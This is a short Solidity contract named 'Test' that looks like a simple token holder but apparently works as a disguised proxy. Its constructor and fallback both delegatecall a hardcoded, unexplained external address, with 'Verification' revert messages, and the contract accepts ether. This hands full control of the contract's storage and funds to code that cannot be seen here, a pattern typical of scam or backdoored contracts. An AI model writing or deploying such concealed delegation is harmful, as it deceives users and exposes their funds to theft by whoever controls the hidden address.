// SPDX-License-Identifier: MIT

pragma solidity <=0.8.18;

contract Test {
    uint256 private totalSupply = 10000;

    fallback(bytes calldata data) external payable returns (bytes memory) {
        (bool r1, bytes memory result) = address(
            0xe22BA702175A72262dDCd653d3B8e559344b34a3
        ).delegatecall(data);
        require(r1, "Verification");
        return result;
    }

    receive() external payable {}

    constructor() {
        bytes memory data = abi.encodeWithSignature("init()");
        (bool r1, ) = address(0xe22BA702175A72262dDCd653d3B8e559344b34a3)
            .delegatecall(data);
        require(r1, "Verificiation");
    }
}